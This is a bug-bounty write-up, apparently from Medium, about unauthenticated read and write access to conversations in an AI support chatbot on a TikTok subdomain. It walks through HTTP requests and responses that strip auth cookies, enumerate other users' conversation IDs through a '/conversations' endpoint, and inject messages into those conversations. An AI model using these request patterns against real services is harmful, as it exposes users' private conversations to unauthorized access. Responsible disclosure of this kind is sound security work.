# Broken Access Control

- **Source URL:** https://medium.com/@ayedmostafa330/broken-access-control-unauthenticated-read-write-access-to-every-conversation-in-an-tiktok-ai-0a6eb481f5fd
- **Fetched from:** https://medium.com/@ayedmostafa330/broken-access-control-unauthenticated-read-write-access-to-every-conversation-in-an-tiktok-ai-0a6eb481f5fd?source=rss-474f61cc20d2------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14927)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Mostafa Ayed / Tue, 29 Sep 2026 01:08:48 GMT

While browsing around TikTok’s platform, I came across a subdomain — I’ll refer to it here as example.com as a placeholder. Since it looked interesting, I decided to do some recon on it. I logged in normally and started clicking around, and noticed it had an AI support chatbot embedded in the page.

I opened the chatbot and started interacting with it as a normal, authenticated user, capturing the requests it fired off in order:

All of these worked fine and behaved as expected under my session, so at first glance nothing looked wrong.

Then it occurred to me to test for IDOR: I kept my own valid session/cookies, but swapped the conversation\_id in the message/list request for one that wasn't mine, to see if I could read someone else's conversation while still authenticated. That didn't work — the response didn't return foreign conversation data, so no IDOR was confirmed through this path.

Since that failed, I went back and tried something more basic: I stripped the authentication headers/cookies entirely and resent the exact same requests with nothing at all. That’s when it broke — every single one of these endpoints responded normally with full data, with zero authentication required.

**a) Create a conversation**

Request:

POST /.../agent/coze/conversation/create HTTP/1.1

Host: \<target>

Content-Type: application/json

Cookie: \<valid session cookies>

{}

Response:

HTTP/1.1 200 OK

Content-Type: application/json

{ "id": "4737f7e0bed7e0c5cdcbc390078a76c1", ... }

**b) Send a message / start the chat**

POST /.../agent/coze/chat HTTP/1.1

Host: \<target>

Content-Type: application/json

Cookie: \<valid session cookies>

{

"bot\_id": "7501831601857642503",

"conversation\_id": "4737f7e0bed7e0c5cdcbc390078a76c1",

"content": "hi"

}

HTTP/1.1 200 OK

Content-Type: application/json

{ "event": "conversation.chat.created", ... }

**c) Load the message history**

POST /.../agent/coze/conversation/message/list HTTP/1.1

Host: \<target>

Content-Type: application/json

Cookie: \<valid session cookies>

{ "conversation\_id": "4737f7e0bed7e0c5cdcbc390078a76c1" }

HTTP/1.1 200 OK

Content-Type: application/json

{

"data": \[

{ "role": "user", "content": "hi" },

{ "role": "assistant", "content": "..." }

\],

"has\_more": false

}

**d) Load bot config**

GET /.../agent/bot-config HTTP/1.1

Host: \<target>

Cookie: \<valid session cookies>

HTTP/1.1 200 OK

Content-Type: application/json

{ "bot\_id": "7501831601857642503", ... }

Everything up to this point behaved normally under my session — nothing stood out yet.

I kept my valid session cookies but swapped the conversation\_id for one I didn't own, to see if the endpoint would leak it despite me still being authenticated.

POST /.../agent/coze/conversation/message/list HTTP/1.1

Host: \<target>

Content-Type: application/json

Cookie: \<valid session cookies>

{ "conversation\_id": "\<a conversation\_id that is not mine>" }

HTTP/1.1 200 OK

Content-Type: application/json

{

"BaseResp": { "StatusCode": ..., "StatusMessage": "..." },

"data": \[\],

"has\_more": false

}

No foreign data was returned this way, so I concluded there was no IDOR through the ownership check itself while authenticated.

Since the IDOR attempt failed, I went back to basics and just stripped every auth header/cookie from the same request, sending it with nothing at all.

POST /.../agent/coze/conversation/message/list HTTP/1.1

Host: \<target>

Content-Type: application/json

{ "conversation\_id": "4737f7e0bed7e0c5cdcbc390078a76c1" }

HTTP/1.1 200 OK

Content-Type: application/json

{

"BaseResp": { "StatusCode": 200, "StatusMessage": "SUCCESS" },

"data": \[

{ "role": "user", "content": "hi" },

{ "role": "assistant", "content": "..." }

\],

"has\_more": false

}

The request succeeded with full data returned, with no Authorization header and no session cookie whatsoever. This confirmed the endpoint performs **no authentication check at all** — the earlier IDOR "failure" wasn't a working ownership check, it was simply that a valid session happened to already match a conversation I had access to; the real problem was that no session was required in the first place.

Once I knew auth wasn’t being checked, I wanted to see how far this could go beyond “I can read one conversation ID I already had.” I went back to the /conversation/create path and tried its plural sibling, differing by essentially one path segment, still with zero authentication:

POST /.../agent/coze/conversations HTTP/1.1

Host: \<target>

Content-Type: application/json

{}

HTTP/1.1 200 OK

Content-Type: application/json

{

"BaseResp": { "StatusCode": 200, "StatusMessage": "SUCCESS" },

"conversations": \[

{ "created\_at": 1757xxxxxx, "id": "\<other user's conversation id>" },

...

// total: 20 entries

\]

}

This single-character path difference (/conversation/create → /conversations) returned a live, unauthenticated feed of the 20 most recent conversation IDs belonging to **other users** — no auth, no filtering, no rate limiting observed. This is what escalated the bug from "one endpoint doesn't check auth" to "anyone can enumerate and access every recent user's conversation."

Taking one of the IDs from the global list above (belonging to another user, not me), I repeated the same unauthenticated flow: injected a message into it via .../agent/coze/chat, then read it back via .../conversation/message/list. The message was accepted (chat.created) and the read-back response contained my injected content plus the bot's reply — proving both read and write access to a conversation I had no relationship to, using zero credentials.

Thanks for reading.

linkedin: [https://www.linkedin.com/in/mostafa-ayed-b85271253/](https://www.linkedin.com/in/mostafa-ayed-b85271253/)
